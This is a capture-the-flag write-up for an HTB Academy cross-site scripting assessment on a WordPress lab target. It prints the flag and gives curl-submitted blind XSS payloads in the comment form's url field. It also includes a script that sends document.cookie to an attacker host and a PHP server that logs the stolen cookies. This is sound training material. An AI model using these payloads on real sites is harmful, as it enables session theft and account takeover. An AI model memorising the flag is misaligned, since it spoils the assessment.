# HTB Academy — CWES Cross-Site Scripting Skills Assessment

**Flag:** `HTB{cr055_5173_5cr1p71n6_n1nj4}`  
**Target:** `10.129.234.166` (VPN)  
**App:** WordPress 5.7.2 Security Blog at `/assessment/`

---

## Attack Chain

### 1. Recon — Find Input Fields
```bash
curl -s http://<TARGET>/assessment/ | grep -i "comment\|feedback\|author\|email\|url\|textarea"
# → Found WordPress comment form on blog post
curl -s "http://<TARGET>/assessment/index.php/2021/06/11/welcome-to-security-blog/" | grep -i "input\|textarea\|name="
# → Fields: comment, author, email, url (website), comment_post_ID=8
```

### 2. Identify Vulnerable Field — Blind XSS Detection
Submit comment via curl with remote script probes in each field:
```bash
curl -s -X POST "http://<TARGET>/assessment/wp-comments-post.php" \
  --data-urlencode "comment=<script src=http://<OUR_IP>:8000/comment></script>" \
  --data-urlencode "author=John Smith" \
  --data-urlencode "email=john@test.com" \
  --data-urlencode 'url="><script src=http://<OUR_IP>:8000/url></script>' \
  -d "comment_post_ID=8&comment_parent=0&submit=Post+Comment"
```
**Result:** PHP server received `GET /url` from target → `url` field is vulnerable.

**Key:** WordPress rejects XSS in `author` field. Keep `author` and `email` clean — only inject in `comment` and `url`.

### 3. Cookie Stealing
```bash
# script.js content:
new Image().src='http://<OUR_IP>:8000/index.php?c='+document.cookie;

# index.php content:
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>

# Start PHP server:
cd /tmp/tmpserver && sudo php -S 0.0.0.0:8000

# Submit payload:
curl -s -X POST "http://<TARGET>/assessment/wp-comments-post.php" \
  --data-urlencode "comment=test" \
  --data-urlencode "author=John Smith" \
  --data-urlencode "email=john2@test.com" \
  --data-urlencode 'url="><script src=http://<OUR_IP>:8000/script.js></script>' \
  -d "comment_post_ID=8&comment_parent=0&submit=Post+Comment"
```
**Result:** Received `GET /index.php?c=wordpress_test_cookie=...;flag=HTB{cr055_5173_5cr1p71n6_n1nj4}`
